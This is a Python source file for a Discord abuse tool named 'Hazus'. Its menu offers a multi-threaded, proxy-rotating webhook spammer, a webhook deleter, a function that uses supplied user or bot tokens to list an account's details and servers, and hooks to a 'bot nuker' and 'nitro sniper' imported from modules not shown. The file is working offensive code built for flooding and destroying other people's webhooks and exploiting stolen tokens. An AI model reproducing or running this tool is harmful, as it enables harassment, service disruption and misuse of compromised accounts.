import colorama
import json
import time
import subprocess
import requests
import os
import sys
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from botnuker import bot_nuker_helper
from shittysniper import shitty_sniper

gray = colorama.Fore.LIGHTBLACK_EX
cyan = colorama.Fore.CYAN
green = colorama.Fore.GREEN
red = colorama.Fore.RED
yellow = colorama.Fore.YELLOW

def cprint(text, type):
    if type == 0:
        print (colorama.Fore.LIGHTBLACK_EX + "[" + colorama.Fore.GREEN + "Success" + colorama.Fore.LIGHTBLACK_EX + "] " + colorama.Fore.CYAN + text)
    if type == 1:
        print (colorama.Fore.LIGHTBLACK_EX + "[" + colorama.Fore.RED + "Error" + colorama.Fore.LIGHTBLACK_EX + "] " + colorama.Fore.CYAN + text)
    if type == 2:
        print (colorama.Fore.LIGHTBLACK_EX + "[" + colorama.Fore.YELLOW + "Warn" + colorama.Fore.LIGHTBLACK_EX + "] " + colorama.Fore.CYAN + text)

def clear():
    if os.name == "nt":
        subprocess.Popen("cls", shell=True)
    else:
        print("\033c")

def get_proxies():
    with open("proxies.txt", 'r') as file:
        proxies = []
        for line in file:
            stripped_line = line.strip()
            if not stripped_line.startswith('#'):
                proxies.append(stripped_line)
        return proxies

def validate_webhook(webhook):
    response = requests.get(webhook)
    if response.status_code == 200:
        return True
    else:
        return False

def post_to_webhook(proxy=False, webhook=None, data=None, headers=None):
    if proxy == False:
        try:
            response = requests.post(webhook, data=json.dumps(data), headers=headers, timeout=5)
            if response.status_code == 204:
                cprint("Sent message to webhook.", 0)
            else:
                cprint("Webhook is being rate limited.", 1)
        except requests.exceptions.ProxyError:
            cprint(f"Proxy {proxy} failed.", 1)
        except requests.exceptions.ReadTimeout:
            cprint(f"Proxy {proxy} Timed out.", 1)
        except:
            cprint(f"Unknown Error: {proxy}", 1)
    else:
        try:
            response = requests.post(webhook, proxies={"http": proxy, "https": proxy}, data=json.dumps(data), headers=headers, timeout=4)
            if response.status_code == 204:
                cprint("Sent message to webhook.", 0)
            else:
                cprint("Webhook is being rate limited.")
        except requests.exceptions.ProxyError:
            cprint(f"Proxy {proxy} failed.", 1)
        except requests.exceptions.ReadTimeout:
            cprint(f"Proxy {proxy} Timed out.", 1)
        except:
            cprint(f"Unknown Error: {proxy}", 1)
def webhook_spammer():
    try:
        webhook = input(colorama.Fore.RESET + "Webhook URL: ")

        if validate_webhook(webhook) is False:
                cprint("Invalid Webhook\n", 1)
                webhook_spammer()

        use_proxies = input(colorama.Fore.RESET + "Use Proxies? (Y/N): ")
        max_threads = int(input("Max Threads (more threads = faster but harder on pc): "))
        username = input("Set username of webhook: ")
        message = input("Message to spam: ")
        data = {
            "content": message,
            "username": username
        }
        headers = {
            "Content-Type": "application/json"
        }
        print ("Spamming webhook. (CTRL + C to stop.)")
        try:
            if use_proxies.lower().strip() == "y":
                proxylist = get_proxies()
                if not proxylist:
                    cprint("ERROR: NO PROXIES IN PROXIES.TXT", 1)
                    webhook_spammer()

                else:
                    try:
                        while True:
                            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                                futures = [executor.submit(post_to_webhook, proxy, webhook, data, headers) for proxy in proxylist]
                                for future in as_completed(futures):
                                    future.result()
                    except KeyboardInterrupt:
                        clear()
                        main()

            if use_proxies.lower().strip() == "n":
                try:
                    while True:
                        with ThreadPoolExecutor(max_workers=max_threads) as executor:
                            futures = [executor.submit(post_to_webhook, webhook, data, headers)]
                            for future in as_completed(futures):
                                future.result()
                except KeyboardInterrupt:
                    clear()
                    main()

            else:
                cprint("ERROR: PLEASE CHOOSE EITHER Y OR N", 0)
                webhook_spammer()

        except KeyboardInterrupt:
            clear()
            main()
    except KeyboardInterrupt:
        clear()
        main()

def read_proxies():
    with open("proxies.txt", 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    return proxies

def validate_proxy(proxy):
    try:
        response = requests.get("https://discord.com/", proxies={"http": proxy, "https": proxy}, timeout=4)
        is_valid = response.status_code == 200
    except requests.RequestException:
        is_valid = False
    return proxy, is_valid

def validate_proxies():
    max_threads = int(input("Max Threads: "))
    print ("Validating Proxies...")
    proxies = read_proxies()
    valid_proxies = []

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_proxy = {executor.submit(validate_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy, is_valid = future.result()
            if is_valid:
                valid_proxies.append(proxy)
                cprint(f"Valid proxy found: {proxy}", 0)
            else:
                cprint(f"Invalid proxy removed: {proxy}", 2)

    with open("proxies.txt", 'w') as file:
        file.write("""# MAKE SURE ALL YOUR PROXIES ARE EITHER HTTP OR HTTPS
# PROXY FORMAT: (proxy ip):(proxy port)
# Example: 127.0.0.1:100\n""")
        for proxy in valid_proxies:
            file.write(proxy + '\n')
    cprint("Validated Proxies.", 0)
    main()

def webhook_deleter():
    try:
        webhook = input(colorama.Fore.RESET + "Webhook to delete: ")

        if validate_webhook(webhook) is False:
            cprint("Invalid Webhook\n", 1)
            webhook_deleter()

        response = requests.delete(webhook)
        if response.status_code == 204:
            cprint("Webhook deleted successfully.\n", 0)
            main()
        else:
            cprint("Failed to delete webhook - if the issue persists dm me on discord: flashgriefs\n", 1)
            webhook_deleter()
        main()
    except KeyboardInterrupt:
        print ("")
        main()
        
def token_info():
    token = input("Token: ")
    response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if response.status_code == 200:
        user_response = requests.get(f"https://discord.com/api/v9/users/@me", headers={"Authorization": token})
        user_data = user_response.json()
        username = user_data.get("username")
        bio = user_data.get("bio", "No bio set.")
        guilds_response = requests.get(f"https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": token})
        print(colorama.Fore.CYAN + f"------------{username}------------\n")
        print(colorama.Fore.CYAN + "Token Type: USER\n")
        print(colorama.Fore.CYAN + f"Bio: {bio}\n")
        print(colorama.Fore.CYAN + f"------------{username}------------\n")
        print(colorama.Fore.CYAN + f"Servers {username} is in:\n")
        guilds_data = guilds_response.json()
        for guild in guilds_data:
            print(colorama.Fore.CYAN + f"Server Name: {guild['name']}, Server ID: {guild['id']}")
    elif response.status_code == 401:
        response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
        if response.status_code == 200:
            user_response = requests.get(f"https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
            user_data = user_response.json()
            username = user_data.get("username")
            bio = user_data.get("bio", "No bio set.")
            guilds_response = requests.get(f"https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            print(colorama.Fore.CYAN + f"------------{username}------------\n")
            print(colorama.Fore.CYAN + "Token Type: BOT\n")
            print(colorama.Fore.CYAN + f"Bio: {bio}\n")
            print(colorama.Fore.CYAN + f"------------{username}------------\n")
            print(colorama.Fore.CYAN + f"Servers {username} is in:\n")
            guilds_data = guilds_response.json()
            for guild in guilds_data:
                print(colorama.Fore.CYAN + f"Server Name: {guild['name']}, Server ID: {guild['id']}")
        else:
            cprint("Invalid Token.\n", 1)
            main()
    else:
        cprint("Unexpected response from Discord API.\n", 1)
        main()
    print("")
    main()

def bot_nuker():
    bot_nuker_helper()
    main()

def shitty_nitro_sniper():
    shitty_sniper()
    cprint("Terminating sniper...", 0)
    time.sleep(10)
    clear()
    main()

options = {
    1: validate_proxies,
    2: webhook_spammer,
    3: webhook_deleter,
    4: token_info,
    5: bot_nuker,
    6: shitty_nitro_sniper,
}

def invalid_option():
    cprint("INVALID OPTION", 1)
    options.get(int(input(colorama.Fore.WHITE + "Choose Option: ")), invalid_option)

def main():
    time.sleep(0.1)
    colorama.just_fix_windows_console()
    print (colorama.Fore.RED + """
                                    ██╗░░██╗░█████╗░███████╗██╗░░░██╗░██████╗
                                    ██║░░██║██╔══██╗╚════██║██║░░░██║██╔════╝
                                    ███████║███████║░░███╔═╝██║░░░██║╚█████╗░
                                    ██╔══██║██╔══██║██╔══╝░░██║░░░██║░╚═══██╗
                                    ██║░░██║██║░░██║███████╗╚██████╔╝██████╔╝
                                    ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═════╝░""")
    print ("https://github.com/FlashGriefs/Hazus\n")
    print (f"""
    {gray}[{cyan}1{gray}]{yellow} Validate Proxies
    {gray}[{cyan}2{gray}]{yellow} Webhook Spammer
    {gray}[{cyan}3{gray}]{yellow} Webhook Deleter
    {gray}[{cyan}4{gray}]{yellow} Token Info
    {gray}[{cyan}5{gray}]{yellow} Bot Nuker
    {gray}[{cyan}6{gray}]{yellow} Shitty Nitro Sniper""")
    proxys = get_proxies()
    if not proxys:
        print ("")
        cprint("THERE ARE NO PROXIES IN PROXIES.TXT YOU MAY EXPERIENCE CRASHES!", 2)
    try:
        choice = int(input(colorama.Fore.WHITE + "\nChoose Option: "))
        if choice in options:
            options[choice]()
        else:
            invalid_option()
    except ValueError:
        cprint("INVALID OPTION", 1)
    except KeyboardInterrupt:
        print("\nExiting.")
        sys.exit(0)

if os.name == 'nt':
    os.system('title Hazus')
else:
    sys.stdout.write(f"\033]0;Hazus\007")
    sys.stdout.flush()


clear()
main()
